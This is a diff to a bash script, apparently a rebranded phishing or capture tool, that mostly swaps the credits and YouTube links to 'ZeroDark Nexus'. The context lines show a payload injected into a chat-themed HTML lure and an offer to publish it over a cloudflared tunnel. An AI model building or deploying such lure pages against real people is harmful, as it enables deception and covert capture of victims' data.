@@ -2,7 +2,7 @@
 # Masterdas Update 2025
 # Powered by TechChip mode by Mahadeb
 # © AppShakti Bangla 
-# visit https://youtube.com/appshaktibangla
+# visit https://youtube.com/@zerodarknexus
 
 trap 'printf "\n";stop' 2
 
@@ -11,9 +11,9 @@ clear
 printf "\e[1;92m=======================================================\e[0m\n"
 printf "\e[1;96m           🚀 Welcome to my project Script 🚀      \e[0m\n"
 printf "\e[1;92m=======================================================\e[0m\n"
-printf "\e[1;93m           🔥 Powered by AppShakti Bangla 🔥      \e[0m\n"
+printf "\e[1;93m           🔥 M...R Powered by ZeroDark Nexus 🔥      \e[0m\n"
 printf "\e[1;92m=======================================================\e[0m\n\n"
-printf "\e[1;91m YouTube link=>\e[1;95m https://youtube.com/@appshaktibangla\e[0m\n\n"
+printf "\e[1;91m YouTube link=>\e[1;95m https://youtube.com/@zerodarknexus\e[0m\n\n"
 printf "\e[1;92m=======================================================\e[0m\n\n"
 }
 
@@ -117,7 +117,7 @@ rm -rf ip.txt
 fi
 sed -e '/tc_payload/r payload' index_chat.html > index.html
 default_option_server="Y"
-read -p $'\n\e[1;93m Do you want to use Yes/y cloudflared tunnel?\n \e[1;92m Type N run localhost:8080 [default Y] \e[0m' option_server
+read -p $'\n\e[1;93m Do you public URL (Yes/y) cloudflared tunnel?\n\n \e[1;92m Type N run localhost:8080 [Public enter Y] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
 cloudflare_tunnel
